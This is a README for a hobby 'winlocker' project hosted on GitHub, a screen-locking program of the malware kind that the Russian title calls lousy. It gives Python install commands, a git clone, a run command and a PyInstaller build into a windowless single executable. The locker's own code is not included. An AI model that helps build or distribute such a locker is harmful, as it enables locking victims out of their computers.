# Хуевый винлокер

> [!IMPORTANT]
> ЭТО ГОВНОКОД!

## How to run?

### **Download Python3**
#### Windows:
Download [Python](https://www.python.org/ftp/python/3.13.5/python-3.13.5-amd64.exe).

#### Ubuntu:
```sh
sudo apt install python3 python pip pip3
```
#### Fedora:
```sh
sudo dnf install python3 python pip pip3
```
#### ArchLinux <3:
```sh
sudo pacman -S python3 python pip pip3
```
---
### **Download Dependencies**

```sh
pip3 install tinker

git clone https://github.com/LozkaDani/xuynawinlocker.git
cd xuynawinlocker
```
---
### **RUN**

```sh
python3 winlocker.py
```
---
### **Build**

```sh
pip install pyinstaller

pyinstaller winlocker.py --onefile -w
```